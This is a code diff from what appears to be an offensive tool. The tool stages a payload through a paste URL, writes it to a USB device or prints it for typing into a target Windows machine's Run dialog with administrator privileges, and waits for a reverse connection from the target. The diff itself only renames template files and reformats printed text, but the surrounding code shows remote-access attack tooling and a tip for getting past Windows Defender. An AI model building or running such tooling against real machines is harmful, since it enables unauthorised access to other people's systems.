@@ -34,7 +34,7 @@ def check_for_connection(first_port):
     last_listening = pane_capture.lower().rfind("listening on")
     last_connection = pane_capture.lower().rfind("connection received")
 
-    if last_listening <= last_connection and pane_capture is not None: # ensure that a connection is still ongoing
+    if last_listening <= last_connection and pane_capture is not None: # Ensure that a connection is still ongoing
         connection_established = True
 
     return connection_established
@@ -152,11 +152,11 @@ def make_new_session():
         config_usb = f.read().strip()
         f.close()
 
-    with open(f"{THIS_DIRECTORY}/src/txt/manual.txt", "r") as f:
-        manual_run = f.read().strip()
+    with open(f"{THIS_DIRECTORY}/src/txt/template_manual.txt", "r") as f:
+        manual_template = f.read().strip()
         f.close()
 
-    with open(f"{THIS_DIRECTORY}/src/txt/usb.txt", "r") as f:
+    with open(f"{THIS_DIRECTORY}/src/txt/template_usb.txt", "r") as f:
         usb_template = f.read()
         f.close()
 
@@ -199,13 +199,14 @@ def make_new_session():
     
     else: # Manual mode
         # ——— If manual mode configured, print the script for the user to copy onto Windows Run dialog themselves
-        print("\n\u001b[34m" \
+        print(
+            "\n\u001b[34m" \
             "Manual mode specified, not writing to USB.\n" \
             "Type the script below onto the target machine's Run dialog.\n" \
             "Once typed into the field, use CTRL + SHIFT + ENTER to run with privileges.\n" \
-            "If Windows Defender flags the script, try running it again.\u001b[90m\n"
+            "If Windows Defender flags the script, try running it again.\u001b[90m"
         )
-        print("\u001b[0m" + manual_run.replace(">>URL<<", paste0_url) + "\n")
+        print("\n\u001b[0m" + manual_template.replace(">>URL<<", paste0_url) + "\n")
 
     # ——— Wait for connection
     print("\u001b[33mWaiting for connection to target...\u001b[90m")
